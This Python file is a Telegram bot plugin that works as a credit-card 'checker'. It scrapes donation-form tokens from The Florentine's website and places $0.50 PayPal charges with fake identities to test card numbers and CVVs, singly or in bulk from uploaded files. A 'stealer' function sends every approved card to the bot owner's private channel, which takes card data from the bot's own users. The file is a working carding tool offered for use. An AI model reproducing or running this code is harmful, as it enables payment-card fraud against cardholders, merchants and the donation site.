import time
import asyncio
import re
import os
import json
import random
import requests
from user_agent import generate_user_agent
from faker import Faker
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

# ========== CONFIGURATION ==========
GATE_NAME = "PayPal - The Florentine ($0.50)"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

fake = Faker()

# ========== STEALER FUNCTION ==========
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ========== ORIGINAL CHECKER FUNCTIONS (synchronous) ==========
def info_requests():
    us = generate_user_agent()
    session = requests.Session()
    return us, session, fake

def var_response_msg(us, session):
    url = "https://www.theflorentine.net/support-the-florentine/"
    headers = {'User-Agent': us}
    resp = session.get(url, headers=headers)
    try:
        hash_val = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', resp.text)[0]
        form_id = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', resp.text)[0]
        prefix = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', resp.text)[0]
        return hash_val, form_id, prefix
    except:
        return None, None, None

def requests_id(us, session, fake, hash_val, form_id, prefix):
    url = "https://www.theflorentine.net/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '0.50',
        'give-form-hash': hash_val,
        'give-amount': '0.50',
        'give_first': fake.first_name(),
        'give_last': fake.last_name(),
        'give_email': fake.email()
    }
    headers = {'User-Agent': us}
    resp = session.post(url, data=payload, headers=headers)
    try:
        return resp.json()["data"]["id"]
    except:
        return None

def info_cards(card_num):
    first_digit = card_num[0]
    types = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}
    return types.get(first_digit, "Unknown")

def response_msg(card_num, exp_month, exp_year, cvv, us, session, fake, order_id, card_type):
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
    """
    variables = {
        "token": order_id,
        "card": {
            "cardNumber": card_num,
            "type": card_type,
            "expirationDate": f'{exp_month}/20{exp_year}',
            "postalCode": fake.zipcode(),
            "securityCode": cvv
        },
        "phoneNumber": fake.phone_number(),
        "firstName": fake.first_name(),
        "lastName": fake.last_name(),
        "billingAddress": {
            "givenName": fake.first_name(),
            "familyName": fake.last_name(),
            "country": "US",
            "line1": fake.street_address(),
            "line2": "",
            "city": fake.city(),
            "state": fake.state_abbr(),
            "postalCode": fake.zipcode()
        },
        "shippingAddress": {
            "givenName": fake.first_name(),
            "familyName": fake.last_name(),
            "country": "US",
            "line1": fake.street_address(),
            "line2": "",
            "city": fake.city(),
            "state": fake.state_abbr(),
            "postalCode": fake.zipcode()
        },
        "email": fake.email(),
        "currencyConversionType": "PAYPAL"
    }
    payload = {"query": query, "variables": variables, "operationName": None}
    headers = {'User-Agent': us, 'Content-Type': 'application/json'}
    resp = session.post(url, data=json.dumps(payload), headers=headers)
    time.sleep(random.randint(2, 5))
    return resp.text

def paypal_check_sync(card_line):
    try:
        parts = card_line.strip().split('|')
        if len(parts) != 4:
            return "Error", "Invalid format (CC|MM|YY|CVV)"
        card_num, exp_month, exp_year, cvv = parts
        # Normalize year to 2-digit
        if len(exp_year) == 4:
            exp_year = exp_year[-2:]
        card_type = info_cards(card_num)

        us, session, fake = info_requests()
        hash_val, form_id, prefix = var_response_msg(us, session)
        if not hash_val:
            return "Error", "Failed to extract form data"
        order_id = requests_id(us, session, fake, hash_val, form_id, prefix)
        if not order_id:
            return "Error", "Failed to create PayPal order"

        resp_text = response_msg(card_num, exp_month, exp_year, cvv, us, session, fake, order_id, card_type)

        # Parse response
        if "accessToken" in resp_text or "cartId" in resp_text:
            return "Approved ✅", "Charged $0.50"
        elif "INVALID_SECURITY_CODE" in resp_text:
            return "Approved ✅", "CVV2 Failure (valid CVV)"
        elif "INSUFFICIENT_FUNDS" in resp_text or "INVALID_BILLING_ADDRESS" in resp_text:
            return "Declined ❌", "Insufficient funds"
        elif "EXISTING_ACCOUNT_RESTRICTED" in resp_text:
            return "Declined ❌", "Existing account restricted"
        elif "RISK_DISALLOWED" in resp_text:
            return "Declined ❌", "Risk disallowed"
        elif "ISSUER_DATA_NOT_FOUND" in resp_text:
            return "Declined ❌", "Issuer data not found"
        elif "R_ERROR" in resp_text:
            return "Declined ❌", "Card generic error"
        elif "ISSUER_DECLINE" in resp_text:
            return "Declined ❌", "Issuer decline"
        elif "EXPIRED_CARD" in resp_text:
            return "Declined ❌", "Expired card"
        elif "LOGIN_ERROR" in resp_text:
            return "Declined ❌", "Login error"
        elif "VALIDATION_ERROR" in resp_text:
            return "Declined ❌", "Validation error"
        else:
            # Try to extract a short message
            return "Declined ❌", resp_text[:100]
    except Exception as e:
        return "Error", str(e)[:50]

# ========== ASYNC WRAPPER ==========
async def paypal_check_async(fullcc):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, paypal_check_sync, fullcc)

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# ========== SINGLE CHECK /pp ==========
@Client.on_message(filters.command("pp", [".", "/"]))
async def paypal_single(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /pp cc|mm|yy|cvv",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        # Animation step 1
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        # Step 2
        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, api_message = await paypal_check_async(fullcc)
        elapsed = time.perf_counter() - start

        # Step 3 (full squares)
        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdchk = await client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        getbin = await get_bin_details(cc)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status:
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, elapsed, first_name, role)

        final_text = f"""<b>{status}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await client.edit_message_text(message.chat.id, thirdchk.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== MASS CHECK /mpp ==========
@Client.on_message(filters.command("mpp", [".", "/"]))
async def paypal_mass(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
            return
        ccs = getcc[1]

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== TXT FILE CHECK /tpp ==========
@Client.on_message(filters.command("tpp", [".", "/"]))
async def paypal_txt(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message

        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(
                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return

        file_path = await client.download_media(target)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== SEQUENTIAL PROCESSING ==========
async def process_sequential(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved_count = 0
    declined_count = 0
    start_time = time.perf_counter()
    approved_cards = []

    progress_msg = await message.reply(
        f"PayPal Florentine Checker\n\n"
        f"{SYMBOL} Progress: 0/{total}\n"
        f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
        f"Checked by: {first_name} ({role})",
        quote=True, parse_mode=enums.ParseMode.HTML
    )

    for idx, fullcc in enumerate(ccs, 1):
        status, api_message = await paypal_check_async(fullcc)

        cc_num = fullcc.split('|')[0]
        bin_data = await get_bin_details(cc_num)
        brand = bin_data[0] if len(bin_data) > 0 else "Unknown"
        type_ = bin_data[1] if len(bin_data) > 1 else "Unknown"
        level = bin_data[2] if len(bin_data) > 2 else "Unknown"
        bank = bin_data[3] if len(bin_data) > 3 else "Unknown"
        country = bin_data[4] if len(bin_data) > 4 else "Unknown"
        flag = bin_data[5] if len(bin_data) > 5 else ""

        if "Approved" in status:
            approved_count += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": api_message,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, card_time, first_name, role)
        else:
            declined_count += 1

        remaining = total - idx
        await progress_msg.edit_text(
            f"PayPal Florentine Checker\n\n"
            f"{SYMBOL} Progress: {idx}/{total}\n"
            f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
            f"Checked by: {first_name} ({role})",
            parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        approved_msg = f"""<b>{card['status']}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for card in declined_list[:15]:
            decl_text += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            decl_text += f"\n... and {declined_count - 15} more declined cards"
        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_text, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
            f"👤 Checked by: {first_name} ({role})",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
    await massdeductcredit(user_id, total)
